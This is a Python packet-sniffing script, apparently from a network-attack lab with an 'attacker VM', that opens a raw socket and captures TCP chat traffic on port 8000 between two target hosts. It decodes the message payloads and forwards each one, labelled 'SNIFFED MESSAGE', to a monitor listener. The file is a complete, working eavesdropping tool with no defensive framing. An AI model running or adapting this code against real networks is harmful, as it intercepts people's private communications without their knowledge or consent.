import socket
import sys
from struct import unpack

# Configuration
MONITOR_IP = "127.0.0.1"  # Monitor is on same machine (attacker VM)
MONITOR_PORT = 9001
CHAT_PORT = 8000

# IPs to monitor (Server and Client)
TARGET_IPS = ["192.168.100.10", "192.168.100.20"]

def eth_addr(raw_bytes):
    """Convert raw bytes to MAC address string"""
    return ':'.join('{:02x}'.format(b) for b in raw_bytes)

def start_sniffer():
    """Sniff packets and forward to monitor"""
    
    print("[*] Starting packet sniffer...")
    print(f"[*] Monitoring traffic on port {CHAT_PORT}")
    print(f"[*] Forwarding to monitor at {MONITOR_IP}:{MONITOR_PORT}")
    print(f"[*] Target IPs: {TARGET_IPS}\n")
    
    # Connect to monitor
    try:
        fwd_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        fwd_socket.connect((MONITOR_IP, MONITOR_PORT))
        print("[+] Connected to monitor\n")
    except socket.error as e:
        print(f"[!] Could not connect to monitor: {e}")
        sys.exit(1)
    
    # Create raw socket for sniffing
    try:
        sniff_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        print("[+] Raw socket created successfully")
        print("[*] Sniffing started...\n")
    except socket.error as e:
        print(f"[!] Socket error: {e}")
        print("[!] Make sure to run with sudo/root privileges")
        sys.exit(1)
    
    packet_count = 0
    
    try:
        while True:
            # Receive packet
            packet, _ = sniff_socket.recvfrom(65535)
            
            # === Layer 2: Ethernet ===
            eth_header = packet[:14]
            eth_data = unpack('!6s6sH', eth_header)
            dest_mac = eth_addr(eth_data[0])
            src_mac = eth_addr(eth_data[1])
            eth_proto = socket.htons(eth_data[2])
            
            # Only process IPv4 packets (protocol 8)
            if eth_proto != 8:
                continue
            
            # === Layer 3: IP ===
            ip_header = packet[14:34]
            ip_data = unpack('!BBHHHBBH4s4s', ip_header)
            
            version = ip_data[0] >> 4
            ihl = (ip_data[0] & 0xF) * 4
            protocol = ip_data[6]
            src_ip = socket.inet_ntoa(ip_data[8])
            dst_ip = socket.inet_ntoa(ip_data[9])
            
            # Only IPv4 and TCP
            if version != 4 or protocol != 6:
                continue
            
            # Check if packet involves our target IPs
            if src_ip not in TARGET_IPS and dst_ip not in TARGET_IPS:
                continue
            
            # === Layer 4: TCP ===
            tcp_start = 14 + ihl
            tcp_header = packet[tcp_start:tcp_start + 20]
            tcp_data = unpack('!HHLLBBHHH', tcp_header)
            
            src_port = tcp_data[0]
            dst_port = tcp_data[1]
            tcp_header_len = (tcp_data[4] >> 4) * 4
            
            # Filter only chat traffic (port 8000)
            if src_port != CHAT_PORT and dst_port != CHAT_PORT:
                continue
            
            # Extract payload
            payload_start = tcp_start + tcp_header_len
            payload = packet[payload_start:]
            
            # Only forward if there's actual data
            if len(payload) == 0:
                continue
            
            # Try to decode as text
            try:
                text = payload.decode('utf-8', errors='ignore').strip()
                if not text:
                    continue
            except:
                continue
            
            # Increment counter
            packet_count += 1
            
            # Format message to send to monitor
            message = (
                f"{'='*60}\n"
                f"[PACKET #{packet_count}]\n"
                f"{'='*60}\n"
                f"Source MAC      : {src_mac}\n"
                f"Dest MAC        : {dest_mac}\n"
                f"Protocol        : TCP\n"
                f"Source IP       : {src_ip}:{src_port}\n"
                f"Dest IP         : {dst_ip}:{dst_port}\n"
                f"Data Length     : {len(payload)} bytes\n"
                f"{'='*60}\n"
                f"SNIFFED MESSAGE:\n"
                f"{text}\n"
                f"{'='*60}\n\n"
            )
            
            # Send to monitor
            try:
                fwd_socket.sendall(message.encode())
                print(f"[+] Packet #{packet_count}: Forwarded {len(payload)} bytes from {src_ip} to {dst_ip}")
            except socket.error:
                print("[!] Lost connection to monitor")
                break
                
    except KeyboardInterrupt:
        print("\n[*] Sniffer stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        fwd_socket.close()
        sniff_socket.close()
        print("[*] Sniffer closed")

if __name__ == "__main__":
    if socket.gethostbyname(socket.gethostname()) == "127.0.0.1":
        print("[!] Warning: Network interface may not be configured properly")
    
    start_sniffer()
